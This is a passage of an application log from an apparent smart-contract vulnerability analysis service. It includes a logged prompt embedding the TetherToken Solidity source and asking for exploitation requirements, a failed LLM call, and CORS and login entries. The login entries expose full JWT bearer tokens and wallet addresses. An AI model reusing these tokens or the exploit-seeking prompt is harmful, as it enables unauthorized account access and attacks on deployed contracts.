ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': "ERROR: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}", 'reasoning': '', 'summary': '', 'code': '', 'code_type': 'solidity', 'duration': 3.5518264770507812}
2025-07-07 17:40:53,294 - services.contract_service - INFO - Has exploit code: False
2025-07-07 17:40:53,294 - services.contract_service - INFO - No vulnerabilities mentioned: False
2025-07-07 17:40:53,294 - services.contract_service - INFO - Final vulnerability determination: False
2025-07-07 17:40:53,294 - services.contract_service - INFO - Attack strategy summary: 
2025-07-07 17:40:53,294 - services.contract_service - INFO - Analysis completed with status: OK
2025-07-07 17:40:53,294 - services.contract_service - INFO - Temporary file /tmp/tmp15ldxvhh.sol removed
2025-07-07 17:40:53,322 - api.contract - INFO - Report saved with filename: Ownable_2025-07-07_17-40, status: OK
2025-07-07 17:40:53,322 - api.contract - INFO - Analysis completed successfully, returning report
2025-07-07 17:40:53,322 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-07 17:40:53,322 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-07 17:40:53,322 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-07 17:40:53,323 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-07 17:40:53,964 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-07 17:40:53,964 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-07 17:40:53,964 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-07 17:40:53,964 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-07 17:40:54,000 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-07 17:40:54,001 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-07 17:40:54,001 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-07 17:40:54,001 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-07 17:53:43,596 - api.contract - INFO - Received analyze request from wallet: 0x201B9f2C14715Df60C9482B5457d05B67031F871
2025-07-07 17:53:43,597 - api.contract - INFO - Analyzing code snippet
2025-07-07 17:53:43,605 - api.contract - INFO - Starting contract analysis for user: 4
2025-07-07 17:53:43,606 - services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpjyf4deu8.sol
2025-07-07 17:53:43,607 - services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-07-07 17:53:43,607 - services.contract_service - INFO - Compiling contract...
2025-07-07 17:53:43,863 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-07-07 17:53:43,967 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-07-07 17:53:43,968 - solcx - INFO - Using solc version 0.8.0
2025-07-07 17:53:43,974 - services.contract_service - INFO - Compilation result: 0 contracts compiled
2025-07-07 17:53:43,974 - services.contract_service - WARNING - No contracts compiled
2025-07-07 17:53:43,974 - services.contract_service - INFO - Temporary file /tmp/tmpjyf4deu8.sol removed
2025-07-07 17:53:43,975 - api.contract - WARNING - No valid Solidity contract found in the provided code
2025-07-07 17:53:43,975 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-07 17:53:43,975 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-07 17:53:43,975 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-07 17:53:43,975 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-08 13:32:14,887 - flask_cors.extension - DEBUG - Request to ''/'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-08 13:32:14,887 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', '*'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type')])
2025-07-08 13:32:14,887 - flask_cors.extension - DEBUG - CORS have been already evaluated, skipping
2025-07-08 13:32:19,169 - flask_cors.extension - DEBUG - Request to ''/'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-08 13:32:19,169 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', '*'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type')])
2025-07-08 13:32:19,169 - flask_cors.extension - DEBUG - CORS have been already evaluated, skipping
2025-07-08 18:11:03,357 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-08 18:11:03,357 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-08 18:11:03,357 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-08 18:11:03,357 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-08 18:11:03,370 - api.auth - INFO - Received login request with method: POST
2025-07-08 18:11:03,370 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '84', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweDIwMUI5ZjJDMTQ3MTVEZjYwQzk0ODJCNTQ1N2QwNUI2NzAzMUY4NzEiLCJleHAiOjE3NTE5MTM2MDR9.Jiq_KZlMj-P9dBCwLerCSAG-3jfBJ9bCrFGO0iknJQE', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-08 18:11:03,370 - api.auth - INFO - Request content type: application/json
2025-07-08 18:11:03,370 - api.auth - INFO - Processing JSON request
2025-07-08 18:11:03,370 - api.auth - INFO - Attempting to authenticate user with wallet: 0x201B9f2C14715Df60C9482B5457d05B67031F871
2025-07-08 18:11:03,540 - api.auth - INFO - Authentication successful for wallet: 0x201B9f2C14715Df60C9482B5457d05B67031F871
2025-07-08 18:11:03,540 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-08 18:11:03,540 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-08 18:11:03,540 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-08 18:11:03,541 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:03:37,212 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:03:37,212 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 10:03:37,212 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:03:37,212 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-09 10:03:37,248 - api.auth - INFO - Received login request with method: POST
2025-07-09 10:03:37,249 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Origin': 'http://localhost:4456', 'Content-Type': 'application/json', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE4MTIyNTB9.g7fuxL1Uecr-DkLBw8XvjLu9iUonnaGWP-RftIWMXEw', 'Referer': 'http://localhost:4456/', 'Content-Length': '79'}
2025-07-09 10:03:37,249 - api.auth - INFO - Request content type: application/json
2025-07-09 10:03:37,249 - api.auth - INFO - Processing JSON request
2025-07-09 10:03:37,249 - api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-09 10:03:37,404 - api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
